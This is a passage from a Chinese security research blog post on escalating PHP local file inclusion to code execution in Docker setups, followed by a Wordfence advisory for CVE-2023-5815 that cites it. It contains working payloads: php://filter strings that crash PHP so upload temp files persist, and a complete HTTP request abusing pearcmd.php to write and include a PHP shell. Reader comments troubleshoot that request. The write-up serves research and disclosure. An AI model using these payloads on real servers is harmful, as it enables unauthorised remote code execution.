如果说第一点我们可以通过爆破来解决，那么第二点是一定无法同时解决的——我们不可能在请求结束前爆破出临时文件名。

经过上面的分析，我们很容易想到一种解决方案：**如果我们可以让PHP进程在请求结束前出现异常退出执行，那么临时文件就可以免于被删除了**。

PHP底层是C语言开发的，不少内存错误都会导致进程异常退出，当然不论是Apache还是PHP-FPM都会存在master进程，在某一个子进程异常退出后会拉起新的进程来处理用户请求，不用担心搞挂服务器。

国内的安全研究者[@王一航](https://www.jianshu.com/p/dfd049924258) 曾发现过一个会导致PHP crash的方法：

```
include 'php://filter/string.strip_tags/resource=/etc/passwd';

```

正好用在文件包含的逻辑中。

这个Bug在[7.1.20](https://github.com/php/php-src/commit/791f07e4f06a943bd7892bdc539a7313fb3d6d1e)以后被修复，也没有留下更新日志，我们可以使用7.1.19版本的PHP进行尝试。向文件包含的目标发送这个导致crash的路径，可见服务器已经挂了，返回空白：

[![image.png](/media/attachment/2021/11/01/e6fd29e5-02b4-406a-829a-c13f2352057d.6fa525d97b76.png)](/media/attachment/2021/11/01/e6fd29e5-02b4-406a-829a-c13f2352057d.png)

我们可以尝试发送10次这个请求，然后来到容器里，可见有10个临时文件都被留在了/tmp目录里：

[![image.png](/media/attachment/2021/11/01/bbf32cb7-7ebe-4812-aca8-a4688ad0f19a.118a4e642f82.png)](/media/attachment/2021/11/01/bbf32cb7-7ebe-4812-aca8-a4688ad0f19a.png)

这就好办了，我们剩下的工作就是爆破这10个临时文件的文件名。只要任意一个命中即可。

我们也可以在一个数据包里多放一些文件表单（默认最多可以有20个），然后多发送几次数据包，这样就可以在遗留下很多临时文件，极大地增加了爆破成功率，减少了爆破所需要的时间。

类似的还有后来[@wupco](https://bugs.php.net/bug.php?id=77231)发现的`php://filter`中另一个可以导致crash的方法，测试代码是：

```
<?php
file(urldecode('php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA'));

```

不过在文件包含场景下，这个POC涉及到`data:`协议，会因为`allow_url_include=Off`而失败。

除了这些利用文件包含本身来crash PHP进程的方法以外，通过一些更通用的无需依赖代码的crash方法也存在，比如<https://bugs.php.net/bug.php?id=78875>、<https://bugs.php.net/bug.php?id=78876>，但都有一些额外条件。

好在PHP是一个开源的语言，后续我们可以通过阅读底层源码，找找能在最新版本下利用的新crash点。

## [0x06 `pearcmd.php`的巧妙利用](#0x06-pearcmdphp)

最后这个是我想介绍的被我“捂烂了”的trick，就是利用`pearcmd.php`这个pecl/pear中的文件。

pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定`--with-pear`才会安装。

不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在`/usr/local/lib/php`。

原本pear/pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。

我最早的时候是在阅读phpinfo()的过程中，发现Docker环境下的PHP会开启`register_argc_argv`这个配置。文档中对这个选项的介绍不是特别清楚，大概的意思是，当开启了这个选项，用户的输入将会被赋予给`$argc`、`$argv`、`$_SERVER['argv']`几个变量。

如果PHP以命令行的形式运行（即sapi是cli），这里很好理解。但如果PHP以Server的形式运行，且又开启了`register_argc_argv`，那么这其中是怎么处理的？

我们在PHP源码中可以看到这样的逻辑：

```
static zend_bool php_auto_globals_create_server(zend_string *name)
{
    if (PG(variables_order) && (strchr(PG(variables_order),'S') || strchr(PG(variables_order),'s'))) {
        php_register_server_variables();

        if (PG(register_argc_argv)) {
            if (SG(request_info).argc) {
                zval *argc, *argv;

                if ((argc = zend_hash_find_ex_ind(&EG(symbol_table), ZSTR_KNOWN(ZEND_STR_ARGC), 1)) != NULL &&
                    (argv = zend_hash_find_ex_ind(&EG(symbol_table), ZSTR_KNOWN(ZEND_STR_ARGV), 1)) != NULL) {
                    Z_ADDREF_P(argv);
                    zend_hash_update(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), ZSTR_KNOWN(ZEND_STR_ARGV), argv);
                    zend_hash_update(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), ZSTR_KNOWN(ZEND_STR_ARGC), argc);
                }
            } else {
                php_build_argv(SG(request_info).query_string, &PG(http_globals)[TRACK_VARS_SERVER]);
            }
        }

    } else {
        zval_ptr_dtor_nogc(&PG(http_globals)[TRACK_VARS_SERVER]);
        array_init(&PG(http_globals)[TRACK_VARS_SERVER]);
    }
    ...

```

第一个if语句判断`variables_order`中是否有`S`，即`$_SERVER`变量；第二个if语句判断是否开启register\_argc\_argv，第三个if语句判断是否有request\_info.argc存在，如果不存在，其执行的是这条语句：

```
php_build_argv(SG(request_info).query_string, &PG(http_globals)[TRACK_VARS_SERVER]);

```

无论php\_build\_argv函数内部是怎么处理的，`SG(request_info).query_string`都非常吸引我，这段代码是否意味着，HTTP数据包中的query-string会被作为argv的值？

果然：

[![image.png](/media/attachment/2021/11/01/27b750f3-bc90-46b9-b6de-0e21425f57d3.fdc8394951d5.png)](/media/attachment/2021/11/01/27b750f3-bc90-46b9-b6de-0e21425f57d3.png)

其实这个结果是符合[RFC3875](http://www.ietf.org/rfc/rfc3875)的：

> 4.4. The Script Command Line
>
> Some systems support a method for supplying an array of strings to
>
>
> search-string = search-word *( "+" search-word )
>
> search-word = 1*schar
>
> schar = unreserved | escaped | xreserved
>
> xreserved = ";" | "/" | "?" | ":" | "@" | "&" | "=" | "," |
>
> "$"
>
> After parsing, each search-word is URL-decoded, optionally encoded in
>
> a system-defined manner and then added to the command line argument
>
> list.

RFC3875中规定，如果query-string中不包含没有编码的`=`，且请求是GET或HEAD，则query-string需要被作为命令行参数。

当年PHP-CGI曾在这上面栽过跟头，具体的细节可以参考我以前写的这篇文章：《[PHP-CGI远程代码执行漏洞（CVE-2012-1823）分析](https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html)》。PHP现在仍然没有严格按照RFC来处理，即使我们传入的query-string包含等号，也仍会被赋值给`$_SERVER['argv']`。

我们再来看到pear中获取命令行argv的函数：

```
public static function readPHPArgv()
{
    global $argv;
    if (!is_array($argv)) {
        if (!@is_array($_SERVER['argv'])) {
            if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) {
                $msg = "Could not read cmd args (register_argc_argv=Off?)";
                return PEAR::raiseError("Console_Getopt: " . $msg);
            }
            return $GLOBALS['HTTP_SERVER_VARS']['argv'];
        }
        return $_SERVER['argv'];
    }
    return $argv;
}

```

先尝试`$argv`，如果不存在再尝试`$_SERVER['argv']`，后者我们可通过query-string控制。也就是说，我们通过Web访问了pear命令行的功能，且能够控制命令行的参数。

看看pear中有哪些可以利用的参数：

[![image.png](/media/attachment/2021/11/01/5b0b1d97-f739-4d67-b98b-82a6d889bd2c.3c9823576498.png)](/media/attachment/2021/11/01/5b0b1d97-f739-4d67-b98b-82a6d889bd2c.png)

第一眼就看到config-create，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。

所以，我构造出最后的利用数据包如下：

```
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
Host: 192.168.1.162:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close

```

[![image.png](/media/attachment/2021/11/01/25526495-da6c-4961-899a-0ca4c6c125bf.d5051ae197a8.png)](/media/attachment/2021/11/01/25526495-da6c-4961-899a-0ca4c6c125bf.png)

发送这个数据包，目标将会写入一个文件`/tmp/hello.php`，其内容包含`<?=phpinfo()?>`：

[![image.png](/media/attachment/2021/11/01/8b834c20-e2bf-434e-a013-b88f518a6ca4.171db8cd1318.png)](/media/attachment/2021/11/01/8b834c20-e2bf-434e-a013-b88f518a6ca4.png)

然后，我们再利用文件包含漏洞包含这个文件即可getshell：

[![image.png](/media/attachment/2021/11/01/6d4093d4-1c7f-4433-86bb-ee0bb3446359.34a26b4a0765.png)](/media/attachment/2021/11/01/6d4093d4-1c7f-4433-86bb-ee0bb3446359.png)

最后这个利用方法，无需条件竞争，也没有额外其他的版本限制等，只要是Docker启动的PHP环境即可通过上述一个数据包搞定。

## [0x07 参考链接](#0x07)

* https://dl.packetstormsecurity.net/papers/general/LFI\_With\_PHPInfo\_Assitance.pdf
* http://www.madchat.fr/coding/php/secu/onsec.whitepaper-02.eng.pdf
* https://stackoverflow.com/questions/24190389/findfirstfile-undocumented-wildcard-or-bug
* https://stackoverflow.com/questions/2563316/findfirstfileex-wildcard-characters
* https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-\_fsrtl\_advanced\_fcb\_header-fsrtlisnameinexpression
* https://www.jianshu.com/p/dfd049924258
* https://bugs.php.net/bug.php?id=77231
* http://www.ietf.org/rfc/rfc3875

# 赞赏

喜欢这篇文章？打赏1元

![](/static/wx.jpg)

# 评论

![](/static/placeholder.jpg)

雨下整夜
Feb 25, 2024, 11:34 PM

回复

强！

![](/static/placeholder.jpg)

MR\_LD
Nov 08, 2023, 3:35 PM

回复

tql,醍醐灌顶

![](/static/placeholder.jpg)

riceman
Oct 17, 2023, 1:16 AM

回复

P神太强了

![](/static/placeholder.jpg)

hypnotic
Sep 25, 2023, 8:56 PM

回复

P神太强了

![](/static/placeholder.jpg)

~~
Dec 14, 2022, 4:10 PM

回复

从最近tp的RCE过来学习P神去年的神作

![](/static/placeholder.jpg)

Ttoc
Nov 20, 2022, 3:06 PM

回复

P神太强了

![](/static/placeholder.jpg)

B0T1
Nov 21, 2021, 9:50 PM

回复

师傅好，当我在虚拟机上测试时，在虚拟机火狐上输入这个网址http://localhost:8080/test.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/3.php，由于<>自动url转码成了%3C?=phpinfo()?%3E，导致文件包含该php文件时不能识别php代码而失败，请问这个怎么解决呢？

![](/static/placeholder.jpg)

B0T1
Nov 21, 2021, 9:51 PM

回复

@B0T1 是关于最后一个pearcmd.php的巧妙利用的试验

![](https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g)

[phithon](https://www.leavesongs.com)
Nov 21, 2021, 9:54 PM

回复

@B0T1 可以尝试使用burpsuite发送数据包。

![](/static/placeholder.jpg)

B0T1
Nov 22, 2021, 9:42 PM

回复

@phithon 嗯，可以了，感谢师傅

![](/static/placeholder.jpg)

B0T1
Nov 23, 2021, 5:57 PM

回复

@phithon 师傅，文章构造数据包payload执行后最后写入文件的是/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>/pear/..
改成这样的顺序:`GET /index.php?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=phpinfo();?>+/tmp/1.php`会不会更清晰好理解一点?（插入文件内容只有/<?=phpinfo()?>/pear/..）

![](/static/placeholder.jpg)

BSOD
Nov 07, 2021, 9:47 PM

回复

P神太强了

![captcha](/captcha/image/310ac82f94f4c3c82a27a1eaddc968b33f920b82/)

Copyright © 2025 Powered by talkbook

* [首页](/)
* [RSS订阅](/feed/)
* [微博](http://weibo.com/101yx)
* [项目](https://github.com/phith0n)
* [更换模板](/template/change/)



=== Content from www.wordfence.com_4a6e903e_20250111_063910.html ===


[![](https://www.wordfence.com/img/wordfence-intelligence-logo.svg)](/threat-intel/)

Have you found a vulnerability in a WordPress plugin or theme? Report vulnerabilities in WordPress plugins and themes through our [bug bounty program](https://www.wordfence.com/threat-intel/bug-bounty-program) and earn a bounty on all in-scope submissions, while we handle the responsible disclosure process on your behalf.

As a reminder, the Wordfence Intelligence Vulnerability Database API is completely free to query and utilize, both personally and commercially, and contains all the same vulnerability data as the user interface. Please review the API documentation and Webhook documentation for more information on how to query the vulnerability API endpoints and configure webhooks utilizing all the same data present in the Wordfence Intelligence user interface.

# News & Blog Designer Pack – WordPress Blog Plugin <= 3.4.1 - Unauthenticated Remote Code Execution via Local File Inclusion

 [Wordfence Intelligence](https://www.wordfence.com/threat-intel)   >    [Vulnerability Database](https://www.wordfence.com/threat-intel/vulnerabilities)   >   News & Blog Designer Pack – WordPress Blog Plugin <= 3.4.1 - Unauthenticated Remote Code Execution via Local File Inclusion

8.1

**Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')**
**CVSS Vector**
[CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)

| CVE | [CVE-2023-5815](https://www.cve.org/CVERecord?id=CVE-2023-5815) |
| --- | --- |
| CVSS | 8.1 (High) |
| Publicly Published | October 26, 2023 |
| Last Updated | January 22, 2024 |
| Researcher | [Florian Hauser](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/florian-hauser) |

### Description

The News & Blog Designer Pack – WordPress Blog Plugin — (Blog Post Grid, Blog Post Slider, Blog Post Carousel, Blog Post Ticker, Blog Post Masonry) plugin for WordPress is vulnerable to Remote Code Execution via Local File Inclusion in all versions up to, and including, 3.4.1 via the bdp\_get\_more\_post function hooked via a nopriv AJAX. This is due to function utilizing an unsafe extract() method to extract values from the POST variable and passing that input to the include() function. This makes it possible for unauthenticated attackers to include arbitrary PHP files and achieve remote code execution. On vulnerable Docker configurations it may be possible for an attacker to create a PHP file and then subsequently include it to achieve RCE.

#### References

* [wordpress.org](https://wordpress.org/plugins/blog-designer-pack/)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=2984052%40blog-designer-pack&new=2984052%40blog-designer-pack&sfp_email=&sfph_mail=)
* [www.leavesongs.com](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp)

#### Share

[Facebook](https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fblog-designer-pack%2Fnews-blog-designer-pack-wordpress-blog-plugin-341-unauthenticated-remote-code-execution&t=News%20%26%20Blog%20Designer%20Pack%20%E2%80%93%20WordPress%20Blog%20Plugin%20%20%3C%3D%203.4.1%20-%20Unauthenticated%20Remote%20Code%20Execution%20via%20Local%20File%20Inclusion "Facebook")
[Twitter](https://twitter.com/share?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fblog-designer-pack%2Fnews-blog-designer-pack-wordpress-blog-plugin-341-unauthenticated-remote-code-execution&text=News%20%26%20Blog%20Designer%20Pack%20%E2%80%93%20WordPress%20Blog%20Plugin%20%20%3C%3D%203.4.1%20-%20Unauthenticated%20Remote%20Code%20Execution%20via%20Local%20File%20Inclusion "Twitter")
[LinkedIn](https://www.linkedin.com/shareArticle?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fblog-designer-pack%2Fnews-blog-designer-pack-wordpress-blog-plugin-341-unauthenticated-remote-code-execution "LinkedIn")
Email

## Vulnerability Details for Blog Grid & Post Grid – Blog Post Slider, Blog Post Carousel, Blog Post Ticker, Blog Post Masonry, Category Post Grid By News & Blog Designer Pack

#### [Blog Grid & Post Grid – Blog Post Slider, Blog Post Carousel, Blog Post Ticker, Blog Post Masonry, Category Post Grid By News & Blog Designer Pack](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/blog-designer-pack)

| Software Type | Plugin |
| --- | --- |
| Software Slug | blog-designer-pack [(view on wordpress.org)](https://wordpress.org/plugins/blog-designer-pack) |
| Patched? | Yes |
| Remediation | Update to version 3.4.2, or a newer patched version |
| Affected Version | * <= 3.4.1 |
| Patched Version | * 3.4.2 |

This record contains material that is subject to copyright.

**Copyright 2012-2025 Defiant Inc.**

**License:**
Defiant hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute this software vulnerability information. Any copy of the software vulnerability information you make for such purposes is authorized provided that you include a hyperlink to this vulnerability record and reproduce Defiant's copyright designation and this license in any such copy.
**[Read more.](https://www.wordfence.com/wordfence-intelligence-terms-and-conditions/)**

**Copyright 1999-2025 The MITRE Corporation**

**License:**
CVE Usage: MITRE hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute Common Vulnerabilities and Exposures (CVE®). Any copy you make for such purposes is authorized provided that you reproduce MITRE's copyright designation and this license in any such copy.
**[Read more.](https://www.cve.org/Legal/TermsOfUse)**

Have information to add, or spot any errors? Contact us at wfi-support@wordfence.com so we can make any appropriate adjustments.

Did you know Wordfence Intelligence provides free personal and commercial API access to our comprehensive WordPress vulnerability database, along with a free webhook integration to stay on top of the latest vulnerabilities added and updated in the database? Get started today!

Learn more

Want to get notified of the latest vulnerabilities that may affect your WordPress site?
 Install Wordfence on your site today to get notified immediately if your site is affected by a vulnerability that has been added to our database.

Get Wordfence

The Wordfence Intelligence WordPress vulnerability database is completely free to access and query via API. Please review the documentation on how to access and consume the vulnerability data via API.

Documentation


